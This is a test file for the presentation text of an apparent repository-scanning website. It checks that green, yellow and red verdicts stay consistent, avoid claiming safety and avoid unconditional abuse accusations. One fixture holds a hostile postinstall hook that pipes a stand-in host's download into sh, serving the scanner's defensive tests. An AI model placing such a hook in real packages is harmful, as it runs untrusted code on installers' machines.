/**
 * The words the site puts on a verdict are part of the contract. A visitor
 * here has not opted into anything and is likelier to be non-technical than a
 * CLI user, so the body text must never contradict the headline above it.
 */

import test from "node:test";
import assert from "node:assert/strict";
import { headline, whatItDoes, whatToDo, DISCLAIMER } from "./present.ts";
import type { Finding } from "@engine/scan.js";

const low: Finding[] = [
  {
    id: "readme-install-first",
    severity: "low",
    file: "readme.md",
    line: 11,
    snippet: "## Install ```sh npm install x ```",
    why: "The README tells the reader to install something within its first lines.",
    next: "Read the code before running anything.",
  } as Finding,
];

const high: Finding[] = [
  {
    id: "lifecycle-script",
    severity: "high",
    file: "package.json",
    line: 5,
    snippet: '"postinstall": "curl http://c.example/p | sh"',
    why: "An install script downloads and runs code.",
    next: "Do not run npm install.",
  } as Finding,
];

test("REGRESSION: a green carrying findings is not given the caution text", () => {
  // A verdict turns yellow at three distinct low signals, so one or two are
  // an ordinary green with those findings listed underneath. That case used
  // to fall through to the yellow body, so the page told a visitor scanning
  // facebook/react that it "has characteristics that scam repos also have"
  // and that they "should not run this code", under a green headline.
  const body = whatItDoes("green", low);
  assert.ok(!body.includes("should not run this code"));
  assert.ok(!body.includes("characteristics that scam repos also have"));
  assert.ok(!/\bscam\b/.test(body), "a green must not put the word scam on the repository");
  // It says why findings appear under a green at all.
  assert.ok(/not a reason to distrust|minor observations/.test(body));
});

test("the green headline and body agree with each other", () => {
  for (const findings of [[] as Finding[], low]) {
    const h = headline("green", "facebook", "react");
    const body = whatItDoes("green", findings);
    assert.ok(h.includes("Nothing known matched"));
    assert.ok(!/don't run|do not run|should not run/i.test(body), `green body warns not to run: ${body}`);
  }
});

test("an AI clear is worded as one, and only when it happened", () => {
  // The one green where signatures did fire. Saying nothing matched would be
  // false, and claiming a model looked when none did would be worse.
  const cleared = whatItDoes("green", low, true);
  assert.ok(cleared.includes("Signals did fire"));
  assert.ok(/one model's judgement|read the findings/i.test(cleared));
  assert.ok(headline("green", "acme", "widget", true).includes("AI second opinion"));

  // The next steps say it too, since their first line otherwise claims
  // nothing known matched, which is the one thing untrue of this green.
  assert.ok(whatToDo("green", true)[0].includes("Signals fired here"));
  assert.ok(!whatToDo("green", true)[0].includes("Nothing known matched"));
  assert.equal(whatToDo("green", true).length, whatToDo("green").length);

  // Absent the flag, nothing may suggest a model was consulted.
  const plain = whatItDoes("green", low);
  assert.ok(!/\bAI\b|model/i.test(plain));
  assert.ok(!/\bAI\b|model/i.test(headline("green", "acme", "widget")));
  assert.ok(whatToDo("green")[0].includes("Nothing known matched"));
});

test("yellow and red keep their instruction to stop", () => {
  assert.ok(whatItDoes("yellow", low).includes("should not run this code"));
  assert.ok(headline("yellow", "acme", "widget").startsWith("Caution:"));
  assert.ok(whatItDoes("red", high).includes("fake-interview malware playbook"));
  assert.ok(headline("red", "acme", "widget").startsWith("Danger:"));
  assert.ok(whatToDo("red")[0].includes("Do NOT run this repo"));
});

test("REGRESSION: the red summary does not repeat a reason it already gave", () => {
  // Two findings of one rule share the opening sentence of their reason.
  // Deduplicating after the slice left dotenvx/dotenvx reading "downloads
  // something from the internet and runs it as a program; this code downloads
  // something from the internet and runs it as a program".
  const same = (file: string): Finding =>
    ({ ...high[0], file, why: "This code downloads something from the internet and runs it as a program. More detail." }) as Finding;
  const body = whatItDoes("red", [same("a.js"), same("b.js"), same("c.js")]);
  const reasons = body.slice(body.indexOf("playbook:") + 9, body.indexOf(". It reads files"));
  assert.equal(reasons.split(";").length, 1, `repeated reason: ${reasons}`);

  // Distinct reasons are still all shown, up to three.
  const varied = ["reads your browser cookies", "hides code in a base64 blob", "phones out to an unknown host", "renames a file deceptively"].map(
    (w, i) => ({ ...high[0], file: `f${i}.js`, why: `${w[0].toUpperCase()}${w.slice(1)}. Detail.` }) as Finding,
  );
  const many = whatItDoes("red", varied);
  assert.equal(many.slice(many.indexOf("playbook:") + 9, many.indexOf(". It reads files")).split(";").length, 3);
});

test("green never reads as proof of safety, wherever it is said", () => {
  assert.ok(DISCLAIMER.includes("nothing known matched"));
  assert.ok(DISCLAIMER.includes("does not prove a repo is safe"));
  assert.ok(headline("green", "acme", "widget").includes("stay careful"));
  assert.ok(whatToDo("green").some((s) => s.includes("not the same as 'safe'")));
  for (const findings of [[] as Finding[], low]) {
    assert.ok(/can't prove a repo is safe|not a reason to distrust/.test(whatItDoes("green", findings)));
  }
});

test("INVARIANT: the site's red body does not claim the pattern is only ever in malware", () => {
  // The CLI carries this invariant in test/report.test.js against
  // `verdictMeaning`. The site never renders that string -- it writes its own
  // words in whatItDoes -- so the same claim has to be pinned twice or the
  // correction reaches only the surface a stranger does not use.
  const body = whatItDoes("red", high);
  for (const claim of ["only ever", "always", "never legitimate", "treat this repository as hostile"]) {
    assert.ok(!body.toLowerCase().includes(claim), `red body claims too much: ${claim}`);
  }
  assert.match(body, /reads files/i);
  assert.match(body, /cannot tell software whose advertised job/i);
  assert.match(body, /do not run this repository/i);
});

test("INVARIANT: a red does not tell every reader to file an abuse report", () => {
  // The body says the tool cannot tell a remote-desktop program from a RAT by
  // reading files. The steps under it used to say "Report the repository to
  // GitHub" and "report the scam to the FBI" with no condition attached, so a
  // visitor who pasted rustdesk was told to report rustdesk. Body and steps
  // have to agree, and the condition belongs on the accusation.
  const steps = whatToDo("red");
  for (const step of steps) {
    if (/report-abuse|ic3\.gov|report them on the platform/.test(step)) {
      assert.match(step, /^(Read the findings below\. )?If /, `unconditional accusation: ${step}`);
    }
  }
  // The instruction that does not depend on being right stays unconditional.
  assert.match(steps[0], /Do NOT run this repo/);
});
